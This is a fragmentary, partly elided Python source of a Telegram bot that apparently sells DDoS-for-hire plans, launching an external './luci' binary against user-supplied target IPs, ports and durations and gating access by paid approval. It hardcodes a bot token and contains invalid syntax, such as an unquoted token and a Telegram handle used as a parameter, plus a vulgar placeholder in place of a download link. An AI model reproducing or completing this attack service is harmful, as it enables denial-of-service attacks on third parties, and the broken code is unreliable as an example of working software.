...
TOKEN = '7358196233:AAEp6WMYwpWmiujzaM-l2Tm6VZkWT58vml8'
...
bot = telebot.TeleBot(7358196233:AAEp6WMYwpWmiujzaM-l2Tm6VZkWT58vml8)
REQUEST_INTERVAL = 1
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./luci {target_ip} {target_port} {duration} 100"
    try:
...
def send_not_approved_message(@KHAN_BHAI_143):
    bot.send_message(@KHAN_BHAI_143, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(5299643232, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(@KHAN_BHAI_143, "*You are not authorized to use this command*", parse_mode='Markdown')
        return
    ...
    if action == '/approve':
        if plan == 1:  # Instant Plan 🧡
            ...
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(@KHAN_BHAI_143, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
                return
...
def handle_message(message):
    ...
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: LAND LELE*", parse_mode='Markdown')
